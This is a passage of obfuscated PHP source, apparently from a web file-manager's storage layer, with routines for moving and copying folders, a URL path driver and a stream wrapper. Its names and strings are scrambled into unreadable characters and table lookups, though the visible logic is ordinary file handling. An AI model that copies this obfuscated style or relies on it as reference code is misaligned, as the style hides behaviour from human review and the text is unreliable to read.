$©Àìô«ë[$±¼ÈÛå¸[192]], $ÂÜ’ùÔ¸); Hook::trigger($±¼ÈÛå¸[679], $“æµ…¿Ê); return $±ººÎ–Œ; } private function _move($ œ÷Õ·®, $ìà­‰½, $×ñÇëñ, &$íù¯ï£ß, $Á§à¡¡â = '') { $Œ€»“÷– =& $_SERVER[±Ö‰ô½¯]; $‰øÍ»§ = $this->sourceInfo($ œ÷Õ·®); $œ•‚–Öç = $‰øÍ»§[$Œ€»“÷–[497]] == $Œ€»“÷–[91]; $¾Æ = $Á§à¡¡â ? $Á§à¡¡â : $‰øÍ»§[$Œ€»“÷–[32]]; $ÉÈŠ¹«„ = $this->fileNameExistAuto($ìà­‰½, $‰øÍ»§); $this->lockMoveStart($ œ÷Õ·®); $this->lockWriteStart($ìà­‰½, $¾Æ); if (!$ÉÈŠ¹«„) { return $this->_moveForce($ œ÷Õ·®, $ìà­‰½, $¾Æ); } $ë…¾ò€„ = $ÉÈŠ¹«„; $‚§¥ºæ× = !1; if ($œ•‚–Öç) { if ($×ñÇëñ == REPEAT_RENAME_FOLDER) { $¾Æ = $this->fileNameAuto($ìà­‰½, $¾Æ, $×ñÇëñ, $œ•‚–Öç); $ë…¾ò€„ = $this->_moveForce($ œ÷Õ·®, $ìà­‰½, $¾Æ); } else { $Í°¬Ÿ˜Ç = $this->_childrenListSelect($ œ÷Õ·®); foreach ($Í°¬Ÿ˜Ç as $ôıâ¼ÒÆ) { $î­»Òæ± = REPEAT_REPLACE; $this->_move($ôıâ¼ÒÆ[$Œ€»“÷–[193]], $ÉÈŠ¹«„, $î­»Òæ±, $íù¯ï£ß); } $‚§¥ºæ× = !0; } } else { if ($×ñÇëñ == REPEAT_RENAME || $×ñÇëñ == REPEAT_RENAME_FOLDER) { $¾Æ = $this->fileNameAuto($ìà­‰½, $¾Æ, $×ñÇëñ, $œ•‚–Öç); $ë…¾ò€„ = $this->_moveForce($ œ÷Õ·®, $ìà­‰½, $¾Æ); } else { $ÈĞé–ş‹ = $this->sourceInfoCache($ÉÈŠ¹«„); $ÇÇÀÊ©å = $this->fileHistory($ÈĞé–ş‹, $‰øÍ»§[$Œ€»“÷–[554]], $‰øÍ»§[$Œ€»“÷–[79]]); if ($ÇÇÀÊ©å) { $íù¯ï£ß[$Œ€»“÷–[649]][] = $‰øÍ»§[$Œ€»“÷–[554]]; } $‚§¥ºæ× = !0; } } if ($‚§¥ºæ×) { $íù¯ï£ß[$Œ€»“÷–[680]] = !0; } return $ë…¾ò€„; } private function _moveForce($ô·îè¡õ, $îŞ·Ş«, $éÁ³è¥Ş) { $éİÊ©© =& $_SERVER[±Ö‰ô½¯]; $ºåìÍ¯ş = $this->sourceInfo($ô·îè¡õ); $øş€ÎŸŒ = $this->sourceInfo($îŞ·Ş«); $ÒÀø¹Ò÷ = $ºåìÍ¯ş[$éİÊ©©[497]] == $éİÊ©©[91]; $õ˜´í¢õ = array($éİÊ©©[489] => $øş€ÎŸŒ[$éİÊ©©[193]], $éİÊ©©[672] => $øş€ÎŸŒ[$éİÊ©©[601]] . $øş€ÎŸŒ[$éİÊ©©[193]] . $éİÊ©©[50], $éİÊ©©[668] => $øş€ÎŸŒ[$éİÊ©©[190]], $éİÊ©©[669] => $øş€ÎŸŒ[$éİÊ©©[586]], $éİÊ©©[671] => USER_ID, $éİÊ©©[506] => $éÁ³è¥Ş); $¾×óúâ¹ = $ºåìÍ¯ş[$éİÊ©©[190]] == SourceModel::TYPE_GROUP && $øş€ÎŸŒ[$éİÊ©©[190]] == SourceModel::TYPE_GROUP && $ºåìÍ¯ş[$éİÊ©©[586]] == $øş€ÎŸŒ[$éİÊ©©[586]]; if (!$¾×óúâ¹ && $this->moveClearAuth) { Model($éİÊ©©[584])->authClear($ô·îè¡õ); } $ÂŠæÏÔİ = $ºåìÍ¯ş[$éİÊ©©[517]] == $éİÊ©©[91] && $øş€ÎŸŒ[$éİÊ©©[517]] != $éİÊ©©[91]; if ($ÂŠæÏÔİ) { $õ˜´í¢õ[$éİÊ©©[516]] = 0; } if ($ÒÀø¹Ò÷) { $‚¶‘±Ë™ = array($éİÊ©©[672] => array($éİÊ©©[632], $ºåìÍ¯ş[$éİÊ©©[601]] . $ºåìÍ¯ş[$éİÊ©©[193]] . $éİÊ©©[633])); $ïÒÙ§ù’ = $ºåìÍ¯ş[$éİÊ©©[601]] . $ºåìÍ¯ş[$éİÊ©©[193]] . $éİÊ©©[50]; $úíÙâ = $øş€ÎŸŒ[$éİÊ©©[601]] . $øş€ÎŸŒ[$éİÊ©©[193]] . $éİÊ©©[50] . $ºåìÍ¯ş[$éİÊ©©[193]] . $éİÊ©©[50]; $¤¾Áè•” = array($éİÊ©©[672] => array($éİÊ©©[681], "\x72\145\x70\x6c\141\143\145\50\x70\141\x72\145\x6e\164\114\145\166\x65\x6c\x2c\x27{$ïÒÙ§ù’}\47\54\x27{$úíÙâ}\47\x29"), $éİÊ©©[668] => $øş€ÎŸŒ[$éİÊ©©[190]], $éİÊ©©[669] => $øş€ÎŸŒ[$éİÊ©©[586]]); if ($ÂŠæÏÔİ) { $¤¾Áè•”[$éİÊ©©[516]] = 0; } $this->where($‚¶‘±Ë™)->data($¤¾Áè•”)->save(); } $this->where(array($éİÊ©©[503] => $ô·îè¡õ))->data($õ˜´í¢õ)->save(); return $ô·îè¡õ; } private function clearShare($öäÔ’©°, $¶ª¹ê¥Ú) { $É—û¯¤ı =& $_SERVER[±Ö‰ô½¯]; $ïÍ¶æœÑ = $this->sourceInfo($öäÔ’©°); $°—Àƒ° = $this->sourceInfo($¶ª¹ê¥Ú); if ($ïÍ¶æœÑ[$É—û¯¤ı[586]] == $°—Àƒ°[$É—û¯¤ı[586]] && $ïÍ¶æœÑ[$É—û¯¤ı[190]] == $É—û¯¤ı[682]) { return; } $Ãâƒµœß = array($É—û¯¤ı[601] => array($É—û¯¤ı[632], $ïÍ¶æœÑ[$É—û¯¤ı[601]] . $öäÔ’©° . $É—û¯¤ı[633])); $†ÜÚæõ½ = $this->field($É—û¯¤ı[503])->where($Ãâƒµœß)->getField($É—û¯¤ı[193], !0); if (!$†ÜÚæõ½) { return; } $Ãâƒµœß = array($É—û¯¤ı[193] => array($É—û¯¤ı[7], $†ÜÚæõ½), $É—û¯¤ı[683] => 1); $ıó¡ëÄ× = Model($É—û¯¤ı[684])->field($É—û¯¤ı[685])->where($Ãâƒµœß)->select(); if (!$ıó¡ëÄ×) { return; } $ıó¡ëÄ× = array_to_keyvalue($ıó¡ëÄ×, $É—û¯¤ı[12], $É—û¯¤ı[685]); $Ãâƒµœß = array($É—û¯¤ı[685] => array($É—û¯¤ı[7], $ıó¡ëÄ×)); Model($É—û¯¤ı[684])->where($Ãâƒµœß)->save(array($É—û¯¤ı[683] => 0)); Model($É—û¯¤ı[686])->where($Ãâƒµœß)->delete(); } public function copyFolderFromIO($öËù¢à¾, $şä¡õ­, $ùŞ¡´ÀÊ, $±÷¥œ’œ, $¤Ì¶éÀÎ, $Ÿ½¬¬†ß = false) { $¼ƒœ¥—ƒ =& $_SERVER[±Ö‰ô½¯]; $óãïÈå­ = array($¼ƒœ¥—ƒ[650] => array(), $¼ƒœ¥—ƒ[651] => array(), $¼ƒœ¥—ƒ[649] => array(), $¼ƒœ¥—ƒ[687] => array()); $ŠÅË„ÚÊ = $Ÿ½¬¬†ß ? $Ÿ½¬¬†ß : $öËù¢à¾->pathThis($şä¡õ­); $ÆôîéŒ = $this->fileNameExist($ùŞ¡´ÀÊ, $ŠÅË„ÚÊ); $ïÌ¸’£ = $this->mkdir($ùŞ¡´ÀÊ, $ŠÅË„ÚÊ, $±÷¥œ’œ); if (!$ÆôîéŒ || $±÷¥œ’œ == REPEAT_RENAME_FOLDER) { $±÷¥œ’œ = !1; } if ($ÆôîéŒ) { $this->_childrenAllMake($ÆôîéŒ); } Hook::trigger($¼ƒœ¥—ƒ[688]); $ŒóÍöÇ´ = KodIO::ioFileDriverGet($¼ƒœ¥—ƒ[495] . $ùŞ¡´ÀÊ . $¼ƒœ¥—ƒ[404]); $this->_copyChildTo($öËù¢à¾, $şä¡õ­, $ïÌ¸’£, $±÷¥œ’œ, $óãïÈå­, $¤Ì¶éÀÎ, $ŒóÍöÇ´); Hook::trigger($¼ƒœ¥—ƒ[689]); if ($ïÌ¸’£) { $this->folderSizeResetChildren($ïÌ¸’£); } $this->_childrenListClear(); Model($¼ƒœ¥—ƒ[652])->addAll($óãïÈå­[$¼ƒœ¥—ƒ[650]], array(), !0); Model($¼ƒœ¥—ƒ[653])->eventCopy($ïÌ¸’£); $this->saveAll($óãïÈå­[$¼ƒœ¥—ƒ[651]]); Model($¼ƒœ¥—ƒ[557])->linkAdd($óãïÈå­[$¼ƒœ¥—ƒ[649]]); Model($¼ƒœ¥—ƒ[557])->remove($óãïÈå­[$¼ƒœ¥—ƒ[687]]); $this->folderSizeReset($ùŞ¡´ÀÊ); $this->updateModifyTime($ùŞ¡´ÀÊ); return $ïÌ¸’£; } private function _copyChildTo($œî­¸ƒÀ, $ç¨óÇÂĞ, $êêÆÑÒÖ, $‰ìøçù¡, &$‰•Ïßˆ¯, $ŒÉèˆîÚ, $îµ££œ¯) { $¾»µıßø =& $_SERVER[±Ö‰ô½¯]; $üêêæé‹ = $this->sourceInfoCache($êêÆÑÒÖ); $äÁêÔä¶ = $œî­¸ƒÀ->listPath($ç¨óÇÂĞ); $äÁêÔä¶ = $äÁêÔä¶ ? $äÁêÔä¶ : array($¾»µıßø[86] => array(), $¾»µıßø[85] => array()); $Ÿ‰ÒâŠ‘ = array_merge($äÁêÔä¶[$¾»µıßø[86]], $äÁêÔä¶[$¾»µıßø[85]]); $¥ìÜùá° = $this->_addFiles($œî­¸ƒÀ, $îµ££œ¯, $äÁêÔä¶[$¾»µıßø[86]], $ŒÉèˆîÚ); $ùÙôì‹± = array(); foreach ($Ÿ‰ÒâŠ‘ as &$Ÿ…Î¡Šç) { if (isset($¥ìÜùá°[$Ÿ…Î¡Šç[$¾»µıßø[32]]])) { $Ÿ…Î¡Šç = $¥ìÜùá°[$Ÿ…Î¡Šç[$¾»µıßø[32]]]; } $Ÿ…Î¡Šç[$¾»µıßø[497]] = $Ÿ…Î¡Šç[$¾»µıßø[33]] == $¾»µıßø[78]; $Ÿ…Î¡Šç[$¾»µıßø[498]] = substr(_get($Ÿ…Î¡Šç, $¾»µıßø[168], $¾»µıßø[12]), 0, 10); $Ÿ…Î¡Šç[$¾»µıßø[79]] = _get($Ÿ…Î¡Šç, $¾»µıßø[79], 0); $Ÿ…Î¡Šç[$¾»µıßø[554]] = _get($Ÿ…Î¡Šç, $¾»µıßø[554], 0); if (!isset($Ÿ…Î¡Šç[$¾»µıßø[690]]) && $Ÿ…Î¡Šç[$¾»µıßø[554]]) { $‰•Ïßˆ¯[$¾»µıßø[687]][] = $Ÿ…Î¡Šç[$¾»µıßø[554]]; } if ($‰ìøçù¡) { $¢âŞüßÂ = $this->fileNameExistCache($êêÆÑÒÖ, $Ÿ…Î¡Šç[$¾»µıßø[32]]); if ($¢âŞüßÂ) { if ($Ÿ…Î¡Šç[$¾»µıßø[497]] || $‰ìøçù¡ == REPEAT_SKIP) { continue; } if ($‰ìøçù¡ == REPEAT_REPLACE) { $ªÒ†ƒ†Å = $this->sourceInfoCache($¢âŞüßÂ); $“ªÉÙÄµ = $this->fileHistory($ªÒ†ƒ†Å, $Ÿ…Î¡Šç[$¾»µıßø[554]], $Ÿ…Î¡Šç[$¾»µıßø[79]]); if ($“ªÉÙÄµ) { $‰•Ïßˆ¯[$¾»µıßø[649]][] = $Ÿ…Î¡Šç[$¾»µıßø[554]]; } continue; } else { if ($‰ìøçù¡ == REPEAT_RENAME) { $Ÿ…Î¡Šç[$¾»µıßø[32]] = $this->fileNameAutoCache($êêÆÑÒÖ, $Ÿ…Î¡Šç[$¾»µıßø[32]], $‰ìøçù¡, !1); } } } } if (!$Ÿ…Î¡Šç[$¾»µıßø[497]] && $Ÿ…Î¡Šç[$¾»µıßø[554]] == 0) { continue; } if (!$Ÿ…Î¡Šç[$¾»µıßø[497]] && $Ÿ…Î¡Šç[$¾»µıßø[554]]) { $‰•Ïßˆ¯[$¾»µıßø[649]][] = $Ÿ…Î¡Šç[$¾»µıßø[554]]; } $ùÙôì‹±[] = $this->_makeItemData($Ÿ…Î¡Šç, $üêêæé‹, $Ÿ…Î¡Šç[$¾»µıßø[32]]); } unset($Ÿ…Î¡Šç); if (!empty($ùÙôì‹±)) { $this->addAll($ùÙôì‹±); $this->_childrenListSelect($êêÆÑÒÖ); } $¼¹ÓÆÉ¯ = $this->_childrenList($êêÆÑÒÖ); $¼¹ÓÆÉ¯ = array_to_keyvalue($¼¹ÓÆÉ¯, $¾»µıßø[32]); foreach ($Ÿ‰ÒâŠ‘ as $Ÿ…Î¡Šç) { $ªÒ†ƒ†Å = $¼¹ÓÆÉ¯[$Ÿ…Î¡Šç[$¾»µıßø[32]]]; $ÊÉÏ—‚ = $ªÒ†ƒ†Å[$¾»µıßø[193]]; $this->_copyApplyMeta($ªÒ†ƒ†Å, $‰•Ïßˆ¯); if ($Ÿ…Î¡Šç[$¾»µıßø[33]] == $¾»µıßø[78]) { $Ÿ…Î¡Šç[$¾»µıßø[87]] = $œî­¸ƒÀ->getPathInner($Ÿ…Î¡Šç[$¾»µıßø[87]]); $this->_copyChildTo($œî­¸ƒÀ, $Ÿ…Î¡Šç[$¾»µıßø[87]], $ÊÉÏ—‚, $‰ìøçù¡, $‰•Ïßˆ¯, $ŒÉèˆîÚ, $îµ££œ¯); } } } private function _addFiles($Ä„çª, $×İËØ•Œ, $€ŒıõœÎ, $ì©¨õ) { $ıé¿â =& $_SERVER[±Ö‰ô½¯]; if (!$€ŒıõœÎ || count($€ŒıõœÎ) == 0) { return array(); } $ĞÒæß¿® = array(); foreach ($€ŒıõœÎ as &$×ÈÚÑ«È) { Hook::trigger($ıé¿â[691], $×ÈÚÑ«È); $×ÈÚÑ«È[$ıé¿â[87]] = $Ä„çª->getPathInner($×ÈÚÑ«È[$ıé¿â[87]]); $Ğï´¢£ = $Ä„çª->hashSimple($×ÈÚÑ«È[$ıé¿â[87]]); $õ„Øƒ¼Ë = $Ä„çª->hashMd5($×ÈÚÑ«È[$ıé¿â[87]]); if (strlen($õ„Øƒ¼Ë) > 10 && !isset($ĞÒæß¿®[$õ„Øƒ¼Ë])) { $ĞÒæß¿®[$õ„Øƒ¼Ë] = array(); } $×ÈÚÑ«È[$ıé¿â[692]] = $Ğï´¢£; $×ÈÚÑ«È[$ıé¿â[560]] = $õ„Øƒ¼Ë; $ĞÒæß¿®[$õ„Øƒ¼Ë][] =& $×ÈÚÑ«È; if (count($ĞÒæß¿®[$õ„Øƒ¼Ë]) > 1) { $×ÈÚÑ«È[$ıé¿â[690]] = !0; } Hook::trigger($ıé¿â[693], $×ÈÚÑ«È); } unset($×ÈÚÑ«È); $óäµÇÓ„ = array($ıé¿â[560] => array($ıé¿â[7], array_keys($ĞÒæß¿®))); $òìÜöŒ™ = Model($ıé¿â[694]); $ş¾ÎŸÂˆ = $òìÜöŒ™->where($óäµÇÓ„)->select(); $ş¾ÎŸÂˆ = $ş¾ÎŸÂˆ ? $ş¾ÎŸÂˆ : array(); foreach ($ş¾ÎŸÂˆ as $Å¶¬¯Á) { if (!isset($ĞÒæß¿®[$Å¶¬¯Á[$ıé¿â[560]]])) { continue; } $¨ä¶×¸­ = $ĞÒæß¿®[$Å¶¬¯Á[$ıé¿â[560]]]; foreach ($¨ä¶×¸­ as &$×ÈÚÑ«È) { $×ÈÚÑ«È[$ıé¿â[554]] = $Å¶¬¯Á[$ıé¿â[554]]; $×ÈÚÑ«È[$ıé¿â[690]] = !0; } unset($×ÈÚÑ«È); } $…›ÆŠ‰ = array(); foreach ($€ŒıõœÎ as $ÛÓŒê¸) { Hook::trigger($ıé¿â[695], $ÛÓŒê¸); if (isset($ÛÓŒê¸[$ıé¿â[690]]) && $ÛÓŒê¸[$ıé¿â[690]]) { Hook::trigger($ıé¿â[696], $ÛÓŒê¸); continue; } $×İÖËĞ = $Ä„çª->getPathInner($ÛÓŒê¸[$ıé¿â[87]]); $·êÇ‡åä = $òìÜöŒ™->addFileMake($×İÖËĞ, $×İËØ•Œ, $ÛÓŒê¸[$ıé¿â[79]], $ÛÓŒê¸[$ıé¿â[692]], $ÛÓŒê¸[$ıé¿â[560]], $ÛÓŒê¸[$ıé¿â[32]], $ì©¨õ); Hook::trigger($ıé¿â[696], $ÛÓŒê¸); if (!is_array($·êÇ‡åä)) { continue; } $…›ÆŠ‰[] = $·êÇ‡åä; } $òìÜöŒ™->addAll($…›ÆŠ‰); $óäµÇÓ„ = array($ıé¿â[560] => array($ıé¿â[7], array_keys($ĞÒæß¿®))); $ş¾ÎŸÂˆ = $òìÜöŒ™->where($óäµÇÓ„)->select(); $ş¾ÎŸÂˆ = $ş¾ÎŸÂˆ ? $ş¾ÎŸÂˆ : array(); foreach ($ş¾ÎŸÂˆ as $Å¶¬¯Á) { if (!isset($ĞÒæß¿®[$Å¶¬¯Á[$ıé¿â[560]]])) { continue; } $Ñ‡× =& $ĞÒæß¿®[$Å¶¬¯Á[$ıé¿â[560]]]; foreach ($Ñ‡× as &$×ÈÚÑ«È) { $×ÈÚÑ«È[$ıé¿â[554]] = $Å¶¬¯Á[$ıé¿â[554]]; } unset($×ÈÚÑ«È); } $»¦çæ„Ê = array(); foreach ($€ŒıõœÎ as $ŸÄ”‰Ú€) { $»¦çæ„Ê[$ŸÄ”‰Ú€[$ıé¿â[32]]] = $ŸÄ”‰Ú€; } return $»¦çæ„Ê; } } define($_SERVER[±Ö‰ô½¯][697], $_SERVER[±Ö‰ô½¯][698]); $rwyscnbfmk = $_SERVER[±Ö‰ô½¯][699]; goto CÑ… „š; c®Ñë’‘±: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ª€«Ì = false) { } public function exist($ùÓ£ğœã) { $¬·«¢Íä = $this->info($ùÓ£ğœã); return $¬·«¢Íä[$_SERVER[±Ö‰ô½¯][234]]; } public function isFile($‡çÉÃö¨) { $Ëöü¸™³ = $this->info($‡çÉÃö¨); return $Ëöü¸™³[$_SERVER[±Ö‰ô½¯][234]]; } public function isFolder($£¼’¥°®) { return !1; } public function size($˜ôŒÇ·) { $âÌñ†Ò˜ = $this->info($˜ôŒÇ·); return $âÌñ†Ò˜[$_SERVER[±Ö‰ô½¯][79]]; } public function info($…Ù¤©ÉÔ) { return $this->infoParse($…Ù¤©ÉÔ); } public function infoAuth($§öÇ‡) { return $this->infoParse($§öÇ‡); } public function infoWithChildren($‚”ÉÎı) { return $this->infoParse($‚”ÉÎı); } public function infoFull($®•Œøµö) { return $this->infoParse($®•Œøµö); } private function infoParse($êåûöÙ) { $Óçí™” =& $_SERVER[±Ö‰ô½¯]; $Š»ûÔ¯ó = $this->header($êåûöÙ); if (!$Š»ûÔ¯ó || !$Š»ûÔ¯ó[$Óçí™”[847]]) { return !1; } $±‹‘”¬ = _get($Š»ûÔ¯ó, $Óçí™”[414], 0); $§†Ù¿ĞÌ = array($Óçí™”[32] => $Š»ûÔ¯ó[$Óçí™”[32]], $Óçí™”[87] => $êåûöÙ, $Óçí™”[33] => $Óçí™”[232], $Óçí™”[79] => intval($±‹‘”¬), $Óçí™”[168] => get_path_ext($Š»ûÔ¯ó[$Óçí™”[32]]), $Óçí™”[1612] => $±‹‘”¬ > 0 && $Š»ûÔ¯ó[$Óçí™”[1760]], $Óçí™”[1613] => !1); return $§†Ù¿ĞÌ; } private function header($õŞáÔµÅ) { $øó›½ê =& $_SERVER[±Ö‰ô½¯]; if (isset(self::$_cacheHeader[$õŞáÔµÅ])) { return self::$_cacheHeader[$õŞáÔµÅ]; } $¹¯£–€  = isset($GLOBALS[$øó›½ê[1761]]) ? $GLOBALS[$øó›½ê[1761]] : !1; $GLOBALS[$øó›½ê[1761]] = !0; self::$_cacheHeader[$õŞáÔµÅ] = url_header($õŞáÔµÅ); $GLOBALS[$øó›½ê[1761]] = $¹¯£–€ ; return self::$_cacheHeader[$õŞáÔµÅ]; } public function hashSimple($öªµ®éæ, $¥™‹Š¥— = false) { $—ç²º¢² =& $_SERVER[±Ö‰ô½¯]; $×ü­§ˆÊ = $this->info($öªµ®éæ); if (!$×ü­§ˆÊ || !$×ü­§ˆÊ[$—ç²º¢²[234]]) { return !1; } $£•ëÑæ™ = $×ü­§ˆÊ[$—ç²º¢²[79]]; $ÆËŞ”×ö = 200; $Ô– ¸˜£ = 50; if ($£•ëÑæ™ <= $ÆËŞ”×ö * $Ô– ¸˜£) { return md5($this->fileSubstr($öªµ®éæ, 0, $£•ëÑæ™)) . $£•ëÑæ™; } $¸äÏ™× = intval($£•ëÑæ™ / $Ô– ¸˜£); $Ö‰ôîµÒ = $—ç²º¢²[12]; $šñ²‚ÈÒ = timeFloat(); $§ıªˆŠ = 15; for ($‰™éÇ³… = 0; $‰™éÇ³… < $Ô– ¸˜£; $‰™éÇ³…++) { if (timeFloat() - $šñ²‚ÈÒ > $§ıªˆŠ) { return !1; } $«¢Ûìã = $this->fileSubstr($öªµ®éæ, $¸äÏ™× * $‰™éÇ³…, $ÆËŞ”×ö); if (!$«¢Ûìã) { return !1; } $Ö‰ôîµÒ .= $«¢Ûìã; } $Ö‰ôîµÒ .= $this->fileSubstr($öªµ®éæ, $£•ëÑæ™ - $ÆËŞ”×ö, $ÆËŞ”×ö); return md5($Ö‰ôîµÒ) . $£•ëÑæ™; } public function getContent($›×»Ú¸á) { return $this->fileSubstr($›×»Ú¸á); } public function fileSubstr($ÌÚ»¤¦Ô, $ıçš·ı£ = 0, $ÜšÀÔ‚ø = -1) { $–æÑÓâ¸ =& $_SERVER[±Ö‰ô½¯]; $­Ñòûœ = $this->info($ÌÚ»¤¦Ô); if (!$­Ñòûœ || !$­Ñòûœ[$–æÑÓâ¸[234]] && $­Ñòûœ[$–æÑÓâ¸[79]] > 1024 * 1024 * 10) { return !1; } if ($ÜšÀÔ‚ø === -1) { $ÜšÀÔ‚ø = $­Ñòûœ[$–æÑÓâ¸[79]]; } if ($ÜšÀÔ‚ø == 0) { return $–æÑÓâ¸[12]; } $«±šÆÄ = array($–æÑÓâ¸[1762] . $ıçš·ı£ . $–æÑÓâ¸[887] . ($ıçš·ı£ + $ÜšÀÔ‚ø - 1)); $ùÙÔª² = url_request($ÌÚ»¤¦Ô, $–æÑÓâ¸[1555], !1, $«±šÆÄ, !1, !1, 30); return $ùÙÔª²[$–æÑÓâ¸[1339]] ? $ùÙÔª²[$–æÑÓâ¸[1339]] : $–æÑÓâ¸[12]; } public function download($Ö„Àë, $„–Ÿ¯Ò‡) { Downloader::start($Ö„Àë, $„–Ÿ¯Ò‡); return $„–Ÿ¯Ò‡; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($™¬šƒ÷, $ÖƒäÈ£“ = '') { $this->info = $this->info($™¬šƒ÷); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[±Ö‰ô½¯][87]]; $this->pathOpen = $™¬šƒ÷; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$™¬šƒ÷])) { self::$_chunkBuffer[$™¬šƒ÷] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÖÉ°ƒğ­) { $Û‚“Ä“€ = $this->fileSubstr($this->pose, $ÖÉ°ƒğ­); $this->pose += strlen($Û‚“Ä“€); return $Û‚“Ä“€; } public function stream_tell() { return $this->pose; } public function stream_seek($áÆûÚ†¦, $¥Äª¾—½) { $³«´¼î =& $_SERVER[±Ö‰ô½¯]; if ($¥Äª¾—½ == SEEK_SET) { $this->pose = $áÆûÚ†¦; } else { if ($¥Äª¾—½ == SEEK_CUR) { $this->pose += $áÆûÚ†¦; } else { if ($¥Äª¾—½ == SEEK_END) { $this->pose = $this->info[$³«´¼î[79]] + intval($áÆûÚ†¦); } } } if ($áÆûÚ†¦ < 0) { $this->pose = $this->info[$³«´¼î[79]] + $áÆûÚ†¦; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[±Ö‰ô½¯][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($àÂ¢Û‘£, $Â´¬±Ó€) { $µÍ§ò™Â =& $_SERVER[±Ö‰ô½¯]; $‹œÄ¨Ğ† = $this->info($àÂ¢Û‘£); return array($µÍ§ò™Â[1461] => 0, $µÍ§ò™Â[1763] => 0, $µÍ§ò™Â[16] => 32768 + 511, $µÍ§ò™Â[1764] => 0, $µÍ§ò™Â[1765] => 0, $µÍ§ò™Â[1766] => 0, $µÍ§ò™Â[1767] => 0, $µÍ§ò™Â[79] => $‹œÄ¨Ğ†[$µÍ§ò™Â[79]], $µÍ§ò™Â[1768] => $‹œÄ¨Ğ†[$µÍ§ò™Â[1611]], $µÍ§ò™Â[1725] => $‹œÄ¨Ğ†[$µÍ§ò™Â[88]], $µÍ§ò™Â[1724] => $‹œÄ¨Ğ†[$µÍ§ò™Â[233]], $µÍ§ò™Â[1769] => 0, $µÍ§ò™Â[1770] => 0); } static $fileInfo = array(); public function info($“¶ŞÅ±) { $©“×«£­ = $_SERVER[±Ö‰ô½¯][1771]; if (isset(self::$fileInfo[$“¶ŞÅ±])) { return self::$fileInfo[$“¶ŞÅ±]; } if (substr($“¶ŞÅ±, 0, strlen($©“×«£­)) != $©“×«£­) { return !1; } self::$fileInfo[$“¶ŞÅ±] = IO::info(substr($“¶ŞÅ±, strlen($©“×«£­))); return self::$fileInfo[$“¶ŞÅ±]; } public static function read($¯Ö±æœĞ, $¿¶¦ÛÇë, $ì÷›ÉíŒ) { if (!isset(self::$_fopenCache[$¯Ö±æœĞ])) { $Â¨»¼‰š = new StreamWrapperIO(); $Â¨»¼‰š->stream_open($¯Ö±æœĞ); self::$_fopenCache[$¯Ö±æœĞ] = $Â¨»¼‰š; } $Â¨»¼‰š = self::$_fopenCache[$¯Ö±æœĞ]; return $Â¨»¼‰š->fileSubstr($¿¶¦ÛÇë, $ì÷›ÉíŒ); } public static function _read($øâ©ÆÜæ, $™ ™Ÿ¦Ç, $¯·³êŠ) { $¯¢³ô‡” =& $_SERVER[±Ö‰ô½¯]; $°ø¿Â‚´ = fopen($øâ©ÆÜæ, $¯¢³ô‡”[1615]); if (!$°ø¿Â‚´) { return $¯¢³ô‡”[12]; } $“š’¾‰¾ = 8192; fseek($°ø¿Â‚´, $™ ™Ÿ¦Ç, SEEK_SET); $×‚ºš™¡ = $¯¢³ô‡”[12]; $œÉìŸ¬ş = 0; while ($œÉìŸ¬ş < $¯·³êŠ) { $õµöõ°Ó = min($“š’¾‰¾, $¯·³êŠ - $œÉìŸ¬ş); $×‚ºš™¡ .= fread($°ø¿Â‚´, $õµöõ°Ó); $œÉìŸ¬ş += $õµöõ°Ó; } fclose($°ø¿Â‚´); return $×‚ºš™¡; } public function fileSubstr($èŠéæ‚, $—Øûİ÷Ï) { $ï»õÀÖ =& $_SERVER[±Ö‰ô½¯]; $ú—˜ÅËÍ = $this->info[$ï»õÀÖ[79]]; $¸Ş¶´½± = $èŠéæ‚; $÷•üŒ‚ = $—Øûİ÷Ï; if ($èŠéæ‚ < 0) { $èŠéæ‚ = $ú—˜ÅËÍ + $èŠéæ‚; } if ($—Øûİ÷Ï === !1) { $—Øûİ÷Ï = $ú—˜ÅËÍ - $èŠéæ‚; } if ($èŠéæ‚ + $—Øûİ÷Ï > $ú—˜ÅËÍ) { $—Øûİ÷Ï = $ú—˜ÅËÍ - $èŠéæ‚; } if ($—Øûİ÷Ï <= 0) { return $ï»õÀÖ[12]; } if ($èŠéæ‚ < 0 || $èŠéæ‚ >= $ú—˜ÅËÍ || $—Øûİ÷Ï <= 0 || $—Øûİ÷Ï > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\145\x52\145\141\144\40\145\162\x72\157\162\x21\x20\163\164\141\x72\x74\75{$èŠéæ‚}\73\x6c\x65\156\147\x74\x68\x3d{$—Øûİ÷Ï}\73\x20\x73\151\172\145\x3d{$ú—˜ÅËÍ}\73"); } $ù‚Ù˜÷ = 64 * 1024; $ßÎ„è¦Æ =& self::$_chunkBuffer[$this->path]; if (!$ßÎ„è¦Æ) { $ßÎ„è¦Æ = array(); } $ÉĞŒÉûì = 0; $ó•Ùıæé = 0; $ÏÛ€¦ = $ï»õÀÖ[12]; foreach ($ßÎ„è¦Æ as $ÉĞŒÉûì => $ÏÛ€¦) { $ÉĞŒÉûì = intval($ÉĞŒÉûì); $ó•Ùıæé = $ÉĞŒÉûì + strlen($ÏÛ€¦); if ($èŠéæ‚ >= $ó•Ùıæé) { continue; } if ($èŠéæ‚ >= $ÉĞŒÉûì && $èŠéæ‚ + $—Øûİ÷Ï <= $ó•Ùıæé) { return substr($ÏÛ€¦, $èŠéæ‚ - $ÉĞŒÉûì, $—Øûİ÷Ï); } break; } if (count($ßÎ„è¦Æ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ï»õÀÖ[1772], $ï»õÀÖ[1773] . count($ßÎ„è¦Æ) . "\x3b\163\164\x61\162\x74\75{$èŠéæ‚}\x2c\154\145\156\147\x74\150\x3d{$—Øûİ÷Ï}\73\x70\157\x73\145\72{$ÉĞŒÉûì}\x7e{$ó•Ùıæé}"); throw new Exception($ï»õÀÖ[1774]); } $•úËó’— = intval($èŠéæ‚ / $ù‚Ù˜÷) * $ù‚Ù˜÷; $»›‰´×à = ceil(($èŠéæ‚ + 